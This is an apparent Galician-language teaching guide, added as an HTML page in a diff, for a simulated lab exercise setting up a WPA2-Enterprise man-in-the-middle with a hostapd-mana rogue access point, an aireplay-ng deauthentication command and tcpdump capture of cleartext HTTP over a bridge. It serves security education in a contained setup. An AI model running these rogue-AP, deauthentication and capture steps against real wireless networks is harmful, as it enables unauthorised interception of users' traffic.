@@ -1,0 +1,230 @@
+<!doctype html><html lang="gl"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Guía da práctica 2.3 — MITM WPA2-Enterprise (EAP) con hostapd-mana</title><style>
+:root{color-scheme:light dark}body{font:16px/1.58 system-ui,Arial;margin:0;background:#f7f9fb;color:#1c2e3d}.wrap{max-width:940px;margin:0 auto;padding:22px 28px 70px}a{color:#1460a0}header{position:sticky;top:0;background:#12334d;color:#fff;padding:12px 26px}header a{color:#fff}article{background:white;border-radius:16px;padding:25px 36px;box-shadow:0 4px 20px #18364f11}h1{font-size:1.7rem;line-height:1.25}h2{font-size:1.35rem;margin-top:2rem;border-bottom:1px solid #d7e0e7;padding-bottom:.4rem}h3{font-size:1.1rem}pre{padding:14px 18px;background:#11283a;color:#e4f5ff;overflow:auto;border-radius:9px;white-space:pre}pre code{font:13px/1.5 ui-monospace,Consolas,monospace}p code,li code{background:#e8eff5;padding:2px 4px;border-radius:4px}table{border-collapse:collapse;display:block;overflow:auto}td,th{border:1px solid #d4e0ea;padding:8px;text-align:left}img{max-width:100%;height:auto}blockquote{border-left:4px solid #14a3b8;padding:2px 12px;background:#eff7f9}.notice{padding:10px 15px;border-left:4px solid #16a5bd;background:#eff9fc;border-radius:6px}.notice.warning{border-color:#db7e26;background:#fff7eb}.notice strong{display:block} @media(max-width:640px){.wrap{padding:12px}article{padding:15px}} </style><header><a href="../index.html">← Volver ao laboratorio interactivo</a> · Guía docente validada</header><main class="wrap"><article><h1>Guía da práctica 2.3 — MITM WPA2-Enterprise (EAP) con hostapd-mana</h1>
+<div class="notice important"><strong>Material de referencia</strong>
+<p>Esta guía baséase na práctica <a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/2-Taller-HE-Practica-WiFi-3.pdf">2-Taller-HE-Practica-WiFi-3.pdf</a>{:target=&quot;_blank&quot;}. O procedemento descrito a continuación corresponde á <strong>topoloxía con ponte <code>br-mitm</code></strong>, preparada polo laboratorio <code>eap_mitm</code>.</p>
+</div>
+<h2>1. Obxectivos e topoloxía</h2>
+<p>Como continuación da <a href="./2.2-ATAQUE_WPA2_EAP_EVIL_TWIN.html">práctica 2.2 — Evil Twin</a>, montaremos <strong>a topoloxía do PDF de referencia</strong>: AP corporativo con FreeRADIUS, cliente PEAP coa CA lexítima, AP intermedio <code>hostapd-mana</code> actuando como proxy RADIUS e ponte de datos <code>br-mitm</code>. O obxectivo final é conectar o cliente de proba <strong>expresamente ao BSSID de MANA</strong> e observar tráfico HTTP ficticio na ponte.</p>
+<p>A selección automática dun AP coa mesma SSID non é determinista. Para que a práctica sexa reproducible, <strong>seleccionaremos expresamente o BSSID do AP intermedio</strong>, tal como indica o PDF. A autenticación PEAP seguirá tendo lugar contra FreeRADIUS real: o proxy non descifra o túnel PEAP nin o tráfico HTTPS.</p>
+<h3>1.1. Equipos e terminais</h3>
+<p>Todos os dispositivos Wi-Fi que se representan son <strong>interfaces simuladas dentro da VM Kali</strong> mediante <code>mac80211_hwsim</code>. Para desenvolver a práctica, abre estas terminais gráficas en Kali:</p>
+<p>| Terminal | Cometido | Espazo de rede |
+|---|---|---|
+| <strong>Consola 1 — Infraestrutura</strong> | Iniciar o escenario e comprobar FreeRADIUS, AP lexítimo e HTTP de proba | Principal; comandos con <code>ip netns exec</code> |
+| <strong>Consola 2 — Cliente</strong> | Comprobar asociación, IP e conectividade do cliente | <code>wifi_cliente_wlan1</code> |
+| <strong>Consola 3 — AP falso</strong> | Arrancar e observar os rexistros de <code>hostapd-mana</code> | <code>mitm_wlan2</code> |
+| <strong>Consola 4 — Ponte MITM</strong> | Crear e verificar <code>br-mitm</code> e a súa conectividade | Comandos desde Kali para <code>mitm_wlan2</code> |
+| <strong>Consola 5 — Observación</strong> | Monitorizar Wi-Fi, fixar o BSSID de MANA e xerar tráfico HTTP | Principal, <code>wlan3</code> |
+| <strong>Consola 6 — Captura HTTP</strong> | Observar co <code>tcpdump</code> os GET ficticios que atravesan a ponte | <code>mitm_wlan2</code>, <code>br-mitm</code> |</p>
+<h3>1.2. Topoloxía de rede utilizada nesta práctica</h3>
+<p><img src="./images/diagrama_topoloxia_mitm_mermaid.png" alt="Topoloxía WPA2-Enterprise MITM: AP e cliente lexítimos, FreeRADIUS e zona do atacante identificada cun recadro vermello descontinuo" /></p>
+<p><strong>Fase A — Inicio do escenario.</strong> <code>wifilabctl up eap_mitm</code> crea o AP lexítimo en <code>wifi_ap_wlan0</code>, o cliente en <code>wifi_cliente_wlan1</code>, FreeRADIUS na rede principal, <code>br-radius</code> e as interfaces do atacante (<code>wlan2</code> en <code>mitm_wlan2</code>; <code>wlan3</code> no espazo principal). <strong>Non inicia automaticamente <code>hostapd-mana</code></strong>.</p>
+<p><strong>Fase B — Preparación da ponte.</strong> Despois de iniciar MANA e obter <code>AP-ENABLED</code>, <code>wifilabctl bridge-mitm</code> crea <code>br-mitm</code> <strong>dentro de <code>mitm_wlan2</code></strong>, une <code>wlan2</code> e <code>veth0</code> e sitúa a IP <code>192.168.50.100/24</code> en <code>br-mitm</code>. A comunicación cara a FreeRADIUS pasa pola infraestrutura <code>br-radius</code> (<code>192.168.50.1</code>).</p>
+<p><strong>Fase C — Cliente no AP intermedio.</strong> Primeiro o cliente está asociado ao AP lexítimo. Despois de activar MANA e a ponte, o cliente conéctase ao BSSID do AP intermedio; a guía inclúe <code>sudo wifilabctl select-mitm</code> para fixar esa selección de maneira reproducible, mantendo a CA lexítima e renovando DHCP. A frecha descontinua da figura representa este <strong>cambio de asociación</strong>, non un enlace permanente entre os dous AP.</p>
+<p>Na validación do laboratorio comprobouse a asociación efectiva a MANA, a autenticación PEAP e a observación de HTTP en <code>br-mitm</code>. O feito de arrancar MANA ou crear a ponte, por separado, non constitúe esa demostración.</p>
+<div class="notice info"><strong>Topoloxía do laboratorio</strong>
+<p>A figura representa <strong>a rede utilizada nesta práctica</strong>: o AP MANA retransmite a autenticación EAP/RADIUS ao FreeRADIUS corporativo e a ponte <code>br-mitm</code> transporta o tráfico de datos. Cando o cliente se asocia a MANA, pódese observar na ponte o tráfico <strong>HTTP sen cifrar</strong> xerado na proba. A autenticación PEAP continúa validando a CA lexítima: non se descifran as credenciais internas EAP nin o tráfico HTTPS.</p>
+</div>
+<h3>1.3. Un único camiño de rede</h3>
+<p>A práctica utiliza exclusivamente <strong>a rede corporativa <code>192.168.50.0/24</code></strong>, <code>br-radius</code> e <code>br-mitm</code>. O DHCP corporativo é único, e o tráfico HTTP de demostración vai a <code>192.168.50.1:8080</code>. Non se debe montar outra subrede no atacante nin activar un segundo DHCP; iso impediría seguir o fluxo que figura no PDF.</p>
+<hr />
+<h2>2. Preparación da infraestrutura — Consola 1</h2>
+<p>O laboratorio prepara <code>br-radius</code> (<code>192.168.50.1/24</code>), FreeRADIUS (<code>UDP/1812</code>), o AP lexítimo <code>wlan0</code> (SSID <code>EMPRESA-XYZ</code>, canle 6), o cliente <code>wlan1</code> e DHCP corporativo na franxa <code>192.168.50.50–192.168.50.100</code>.</p>
+<p>Inicia o escenario <strong>con NAT exterior habilitado</strong>, tal como se comprobou no laboratorio. Así queda preparado desde o principio tanto o acceso á rede corporativa como a proba de conectividade a Internet do cliente, sen ter que reiniciar posteriormente a infraestrutura.</p>
+<pre><code class="language-bash">sudo env WIFILAB_ENABLE_NAT=1 wifilabctl up eap_mitm
+sudo wifilabctl status
+</code></pre>
+<p>A variable <code>WIFILAB_ENABLE_NAT=1</code> habilita o encamiñamento de saída do laboratorio; non modifica a autenticación EAP/RADIUS nin substitúe a ponte <code>br-mitm</code> que se configurará máis adiante. A VM Kali debe ter conectividade exterior para superar a comprobación con <code>8.8.8.8</code>.</p>
+<p>Comproba o servidor de autenticación:</p>
+<pre><code class="language-bash">sudo ss -lunp | grep ':1812'
+# FreeRADIUS debe escoitar en 192.168.50.1:1812.
+</code></pre>
+<p>O servidor HTTP local forma parte da proba do PDF. Comproba que responde antes de crear MANA:</p>
+<pre><code class="language-bash">curl -f http://192.168.50.1:8080/
+</code></pre>
+<p><strong>Exemplo de saída comprobada:</strong></p>
+<pre><code class="language-html">&lt;!doctype html&gt;&lt;html lang=&quot;gl&quot;&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Laboratorio Wi-Fi&lt;/title&gt;&lt;h1&gt;Proba HTTP do laboratorio&lt;/h1&gt;&lt;/html&gt;
+</code></pre>
+<p>A continuación, na Consola 2, comprobaremos tamén a saída a Internet do cliente mediante <code>8.8.8.8</code>; a conexión a FreeRADIUS e ao servidor HTTP local non depende desa saída exterior.</p>
+<h2>3. Verificación do cliente lexítimo — Consola 2</h2>
+<p>Non é necesario abrir unha terminal dentro do <em>namespace</em>; executaremos as ordes desde Kali:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+sudo ip netns exec wifi_cliente_wlan1 ip -4 addr show dev wlan1
+sudo ip netns exec wifi_cliente_wlan1 ip -4 route
+sudo ip netns exec wifi_cliente_wlan1 ping -c 3 192.168.50.1
+</code></pre>
+<p>O cliente debería estar conectado inicialmente ao <strong>BSSID do AP lexítimo na canle 6</strong> e obter unha IP da rede <code>192.168.50.0/24</code>. O seu perfil de <code>wpa_supplicant</code> inclúe <code>ca_cert=&quot;/etc/freeradius/3.0/certs/ca.pem&quot;</code>: verifica a CA lexítima do servidor PEAP tanto no AP corporativo como no proxy. Anota o BSSID inicial para comparalo despois co de MANA.</p>
+<pre><code class="language-bash">sudo grep -E 'ssid=|eap=|ca_cert=' /home/kali/wifiLab/run/eap_mitm/wpa_supplicant.conf
+</code></pre>
+<p>Comproba tamén a saída a Internet do cliente, que habilitamos ao iniciar o escenario:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 ping -c 3 8.8.8.8
+</code></pre>
+<p><strong>Exemplo de comprobación inicial:</strong> o cliente asociouse ao BSSID lexítimo <code>4a:b3:6f:d5:0f:4b</code> (canle 6), recibiu <code>192.168.50.76/24</code> e respondeu aos tres pings, tanto a <code>192.168.50.1</code> como a <code>8.8.8.8</code>. A IP e o BSSID son valores da execución de referencia e poden variar noutra VM.</p>
+<h2>4. Arranque do punto de acceso intermedio — Consola 3</h2>
+<p><code>wifilabctl up eap_mitm</code> xa preparou <code>mitm_wlan2</code> e xerou a configuración do AP intermedio a partir do escenario. Non é necesario crear o <em>namespace</em> nin escribir un segundo ficheiro manual.</p>
+<h3>4.1. Examinar a configuración de MANA</h3>
+<pre><code class="language-bash">sudo cat /home/kali/wifiLab/run/eap_mitm/mana.conf
+</code></pre>
+<p>Os parámetros principais coinciden co PDF de referencia:</p>
+<pre><code class="language-ini">interface=wlan2
+ssid=EMPRESA-XYZ
+channel=1
+wpa=2
+wpa_key_mgmt=WPA-EAP
+ieee8021x=1
+auth_server_addr=192.168.50.1
+auth_server_port=1812
+auth_server_shared_secret=testing123
+eap_server=0
+</code></pre>
+<p><strong><code>eap_server=0</code> conserva o proxy RADIUS</strong>, polo que a autenticación procede do FreeRADIUS lexítimo. Non se activa un éxito EAP forzado nin a captura do método MSCHAPv2 interno. O cliente segue comprobando a CA do servidor PEAP.</p>
+<h3>4.2. Iniciar <code>hostapd-mana</code></h3>
+<p>Na terceira terminal, desde Kali, executa:</p>
+<pre><code class="language-bash">sudo wifilabctl mana-start
+sudo tail -f /home/kali/wifiLab/run/eap_mitm/mana-ap.log
+</code></pre>
+<p>A saída debe incluír <code>AP-ENABLED</code>. Utiliza <code>Ctrl+C</code> para deter <strong>só <code>tail</code></strong>, sen pechar o proceso MANA. Anota o BSSID mostrado para <code>wlan2</code>; tamén podes consultalo mediante:</p>
+<pre><code class="language-bash">sudo ip netns exec mitm_wlan2 iw dev wlan2 info
+</code></pre>
+<p><strong>Exemplo de saída no inicio de MANA:</strong></p>
+<pre><code class="language-text">Using interface wlan2 with hwaddr 1e:8a:fc:9c:b2:84 and ssid &quot;EMPRESA-XYZ&quot;
+wlan2: RADIUS Authentication server 192.168.50.1:1812
+wlan2: interface state UNINITIALIZED-&gt;ENABLED
+wlan2: AP-ENABLED
+</code></pre>
+<p>O BSSID mostrado é un exemplo: obtén sempre o da túa execución. Este paso confirma que o AP intermedio está listo. O cliente <strong>aínda pode seguir asociado ao AP lexítimo</strong>; a selección do BSSID comprobarase máis adiante.</p>
+<h2>5. Crear e validar a ponte — Consola 4</h2>
+<p>Abre <strong>outra terminal en Kali, fóra do namespace do atacante</strong>, e executa:</p>
+<pre><code class="language-bash">sudo wifilabctl bridge-mitm
+sudo ip netns exec mitm_wlan2 ip -4 addr show dev br-mitm
+sudo ip netns exec mitm_wlan2 bridge link show
+sudo ip netns exec mitm_wlan2 ip route
+sudo ip netns exec mitm_wlan2 ping -c 3 192.168.50.1
+</code></pre>
+<p>Comprobacións esperadas:</p>
+<ol>
+<li><code>br-mitm</code> ten <code>192.168.50.100/24</code>.</li>
+<li><code>wlan2</code> e <code>veth0</code> aparecen como membros da ponte.</li>
+<li>A ruta por defecto do namespace MITM pasa por <code>br-mitm</code> cara a <code>192.168.50.1</code>.</li>
+<li>O ping a <code>192.168.50.1</code> responde.</li>
+</ol>
+<p><strong>Saída observada na proba:</strong></p>
+<pre><code class="language-text">[OK] br-mitm configurada: wlan2 + veth0, 192.168.50.100/24
+wlan2:  ... master br-mitm state forwarding
+veth0:  ... master br-mitm state forwarding
+3 packets transmitted, 3 received, 0% packet loss
+</code></pre>
+<p><strong>Este é o punto no que a topoloxía do segundo panel do diagrama queda montada.</strong> Ningunha destas probas, por separado, acredita a migración do cliente ao AP falso.</p>
+<h2>6. Observación do AP lexítimo e do AP falso — Consola 5</h2>
+<p>Prepara a interface de monitorización <strong>sen empregar <code>airmon-ng check kill</code></strong>, porque podería deter servizos que sosteñen o laboratorio:</p>
+<pre><code class="language-bash">sudo iw dev wlan3 info
+</code></pre>
+<p>Se <code>wlan3</code> non está en modo monitor, podes preparala coas ferramentas habituais do taller (por exemplo <code>sudo airmon-ng start wlan3</code>) e confirmar o <strong>nome resultante</strong> con <code>iw dev</code>. Non supoñas que ten que ser sempre <code>wlan3mon</code>.</p>
+<p>Co escaneo, comproba que existen dous AP coa mesma SSID <code>EMPRESA-XYZ</code> pero <strong>BSSID diferentes</strong>: lexítimo (canle 6) e MANA (canle 1). Unha saída de escaneo non demostra que o cliente elixa o AP falso.</p>
+<p>No espazo de rede do cliente, a comprobación decisiva é:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+</code></pre>
+<ul>
+<li><strong>BSSID lexítimo / canle 6:</strong> a vítima segue no AP corporativo. A ponte e MANA poden estar listos, pero non se demostrou unha interceptación.</li>
+<li><strong>BSSID do AP MANA / canle 1:</strong> hai evidencia de asociación ao AP falso; falta comprobar EAP/PEAP, IP e tráfico posterior.</li>
+<li><strong><code>Not connected</code>:</strong> a asociación non se estableceu; revisa os logs antes de continuar.</li>
+</ul>
+<h3>6.1. Observación da desautenticación (páxinas 16–17 do PDF)</h3>
+<p>Para comparar coas prácticas WPA2-PSK, podes observar unha desautenticación controlada, <strong>exclusivamente neste laboratorio simulado</strong>. Non se trata de garantir a migración ao AP MANA.</p>
+<p>Primeiro identifica a MAC do cliente e o BSSID <strong>real</strong> do AP lexítimo:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+sudo ip netns exec wifi_cliente_wlan1 cat /sys/class/net/wlan1/address
+</code></pre>
+<p>Se <code>airmon-ng</code> creou <code>wlan3mon</code>, configura a canle do AP lexítimo e realiza un intento limitado (substitúe os enderezos polos obtidos):</p>
+<pre><code class="language-bash">sudo iw dev wlan3mon set channel 6
+sudo aireplay-ng --deauth 3 -a &lt;BSSID_AP_LEXITIMO&gt; -c &lt;MAC_CLIENTE&gt; wlan3mon
+</code></pre>
+<p>Comproba de novo a asociación:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+</code></pre>
+<p><strong>Resultado observado na execución de referencia:</strong> <code>aireplay-ng</code> informou de <code>0 ACKs</code> nas ráfagas enviadas. Posteriormente, a consulta <code>iw dev wlan1 link</code> amosou que o cliente estaba conectado ao BSSID MANA <code>1e:8a:fc:9c:b2:84</code>, na canle 1.</p>
+<p><strong>Interpretación:</strong> o cambio de asociación está comprobado, pero os <code>0 ACKs</code> <strong>non permiten demostrar que a desautenticación recibida fose a causa do cambio</strong>. O cliente tamén pode reconectar ao AP lexítimo ou quedar temporalmente sen conexión. Non se deben repetir ráfagas indefinidamente. Se <code>wlan3</code> conservou o nome en modo monitor, emprégao no canto de <code>wlan3mon</code>; confírmao con <code>iw dev</code>.</p>
+<h3>6.2. Fixar e comprobar a asociación ao AP MANA</h3>
+<p>Unha desautenticación non garante a elección do AP falso. Para que todo o alumnado complete a mesma secuencia, <strong>fixaremos o BSSID de MANA no perfil temporal do cliente simulado</strong>, como indica o PDF (páxina 17), mesmo se a consulta anterior xa amosa unha asociación ao AP intermedio:</p>
+<pre><code class="language-bash">sudo wifilabctl select-mitm
+</code></pre>
+<p>O controlador toma o BSSID real de <code>wlan2</code>, mantén <code>ca_cert</code> e reinicia só o <code>wpa_supplicant</code> do cliente simulado. Despois solicita unha concesión DHCP á mesma rede corporativa. A configuración temporal queda en <code>run/eap_mitm/wpa_supplicant-mana.conf</code>; o perfil base consérvase.</p>
+<p>Comproba que o cliente se atopa <strong>na canle 1 e conectado ao BSSID de MANA</strong>, non ao AP lexítimo na canle 6:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+sudo ip netns exec wifi_cliente_wlan1 wpa_cli -i wlan1 status
+</code></pre>
+<p><strong>Saída observada ao completar a asociación e a autenticación na proba:</strong></p>
+<pre><code class="language-text">wlan2: STA 22:99:ae:aa:ad:8f IEEE 802.11: associated (aid 1)
+wlan2: AP-STA-CONNECTED 22:99:ae:aa:ad:8f
+wlan2: STA 22:99:ae:aa:ad:8f IEEE 802.1X: authenticated - EAP type: 25 (PEAP)
+</code></pre>
+<p>A comprobación no cliente amosou:</p>
+<pre><code class="language-text">Connected to 1e:8a:fc:9c:b2:84 (on wlan1)
+SSID: EMPRESA-XYZ
+freq: 2412.0
+</code></pre>
+<p>A liña <code>AP-STA-CONNECTED</code> e a autenticación PEAP deben referirse á mesma MAC de cliente, e o BSSID visto polo cliente debe coincidir co de MANA. As direccións MAC cambian entre execucións. Se falla a asociación ou EAP/PEAP, revisa <code>mana-ap.log</code>, <code>wpa_supplicant-mana.log</code> e os rexistros de FreeRADIUS antes de continuar.</p>
+<p>A saída <code>MANA WPA2 HASHCAT | WPA*02...</code>, que tamén pode aparecer nos rexistros, <strong>non demostra a recuperación das credenciais PEAP</strong>.</p>
+<h2>7. Verificación de EAP/PEAP e do tráfico</h2>
+<p>Co cliente <strong>conectado expresamente ao BSSID de MANA</strong>, comproba autenticación e conectividade:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+sudo ip netns exec wifi_cliente_wlan1 wpa_cli -i wlan1 status
+sudo ip netns exec wifi_cliente_wlan1 ip -4 addr show dev wlan1
+sudo ip netns exec wifi_cliente_wlan1 ping -c 3 192.168.50.1
+</code></pre>
+<p>Na Consola 3 consulta os rexistros de MANA e de FreeRADIUS. A saída <code>wpa_state=COMPLETED</code> xunto co BSSID de MANA e o acceso á rede corporativa son probas complementarias. O controlador ofrece ademais unha comprobación reproducible:</p>
+<pre><code class="language-bash">sudo wifilabctl verify-mitm
+</code></pre>
+<p><strong>Saída de referencia de <code>verify-mitm</code> obtida na VM:</strong></p>
+<pre><code class="language-text">[OK] BSSID do cliente = MANA
+[OK] Autenticación EAP completada
+[OK] Conectividade corporativa
+[OK] HTTP local accesible
+BSSID MANA: 1e:8a:fc:9c:b2:84
+[OK] Cliente -&gt; MANA -&gt; br-mitm -&gt; rede corporativa. Captura HTTP por verificar no atacante.
+</code></pre>
+<p>Estas comprobacións demostran que o cliente se conectou ao BSSID de MANA, completou a autenticación e pode chegar á rede corporativa. <strong>O controlador non verifica por si mesmo que <code>tcpdump</code> capturase o HTTP</strong>: esa evidencia corresponde á Consola 6, no seguinte apartado. Na validación do laboratorio observouse tamén esa captura.</p>
+<h3>7.1. Observar HTTP en claro atravesando <code>br-mitm</code> — Consola 6</h3>
+<p>A última fase do PDF <strong>non consiste só en comprobar ICMP</strong>: debemos observar unha petición HTTP ficticia que o cliente emite cara ao servidor de laboratorio <code>192.168.50.1:8080</code>.</p>
+<p>Na <strong>sexta terminal</strong> deixa activa a captura en texto no namespace MITM:</p>
+<pre><code class="language-bash">sudo ip netns exec mitm_wlan2 tcpdump -ni br-mitm -A 'tcp port 8080'
+</code></pre>
+<p>Desde a <strong>segunda terminal</strong> (cliente simulado), executa:</p>
+<pre><code class="language-bash">sudo ip netns exec wifi_cliente_wlan1 curl http://192.168.50.1:8080/
+sudo ip netns exec wifi_cliente_wlan1 curl -G \
+  --data-urlencode 'usuario=proba' \
+  --data-urlencode 'valor=docente' \
+  http://192.168.50.1:8080/
+</code></pre>
+<p><strong>Exemplo real de saída capturada en <code>br-mitm</code>:</strong></p>
+<pre><code class="language-http">GET /?usuario=proba&amp;valor=docente HTTP/1.1
+Host: 192.168.50.1:8080
+User-Agent: curl/8.22.0
+Accept: */*
+</code></pre>
+<p>Na mesma captura apareceu a resposta <code>HTTP/1.0 200 OK</code> e o corpo HTML de demostración. É a evidencia de que a ponte do atacante transportou e permitiu observar o <strong>HTTP en claro</strong> xerado polo cliente. Para atribuír esta comunicación ao escenario MITM, comproba antes a asociación ao BSSID de MANA e que a captura se realiza sobre <code>br-mitm</code>.</p>
+<p>Non se descifra PEAP nin HTTPS nesta actividade; só se observa HTTP local sen cifrar. Pódese gardar a captura, se se precisa:</p>
+<pre><code class="language-bash">sudo ip netns exec mitm_wlan2 tcpdump -ni br-mitm -s 0 \
+  -w /tmp/http-mitm.pcap 'tcp port 8080'
+</code></pre>
+<h3>7.2. Que podemos dicir do handshake EAP?</h3>
+<p>En WPA2-PSK, a chave criptográfica derívase da PSK, de modo que un handshake pode empregarse para comprobar candidatos a esa clave. En <strong>WPA2-Enterprise</strong>, pola contra, a PMK obtense do proceso EAP e non se recupera o contrasinal de <code>ana</code> atacando simplemente un <code>WPA*02</code> co dicionario Rockyou. Isto non implica que <strong>todas</strong> as implantacións EAP sexan seguras: a validación do certificado RADIUS e o método EAP empregado seguen sendo fundamentais.</p>
+<h2>8. Resultados e criterios de avaliación</h2>
+<p>| Evidencia | Como se comproba | Que significa |
+|---|---|---|
+| AP e cliente lexítimos | <code>wifilabctl status</code>, <code>iw dev wlan1 link</code> | Infraestrutura base funcional |
+| FreeRADIUS en <code>192.168.50.1:1812</code> | <code>ss -lunp</code> e rexistros | Servizo de autenticación preparado |
+| AP MANA iniciado | <code>AP-ENABLED</code> | AP falso emitindo, non implica MITM |
+| Ponte MITM operativa | <code>bridge-mitm</code>, <code>bridge link</code>, ping a <code>192.168.50.1</code> | Topoloxía da figura creada |
+| Asociación do cliente a MANA | BSSID/canle en <code>iw dev wlan1 link</code> | Cliente conectado ao AP falso |
+| Autenticación EAP efectiva | <code>wpa_cli status</code>, logs MANA/RADIUS | Intercambio EAP completado no camiño estudado |
+| Tráfico HTTP atravesa a ponte | <code>tcpdump -ni br-mitm -A 'tcp port 8080'</code> e <code>curl</code> desde o cliente | <code>GET</code> ficticio visible no atacante |</p>
+<div class="notice important"><strong>Conclusión da práctica</strong>
+<p>A topoloxía do diagrama <strong>é a que se emprega nesta práctica</strong>. Na validación realizada, o cliente conectouse ao BSSID de MANA, completou PEAP coa CA lexítima, obtivo conectividade e o HTTP ficticio foi observado en <code>br-mitm</code>. Para repetir a práctica, verifica as mesmas evidencias na túa execución; se falta algunha, revisa os rexistros correspondentes antes de rematar. O tráfico HTTPS e o interior do túnel PEAP continúan cifrados.</p>
+</div>
+<h2>9. Limpeza do escenario</h2>
+<p>Ao rematar, pecha as terminais que manteñen procesos de captura e MANA e executa desde Kali:</p>
+<pre><code class="language-bash">sudo wifilabctl reset
+</code></pre>
+<hr />
+</article><p>Fonte: Markdown orixinal de <code>20261121_docs.he-ud2.zip</code>. O procedemento debe executarse exclusivamente no laboratorio docente autorizado.</p></main></html>
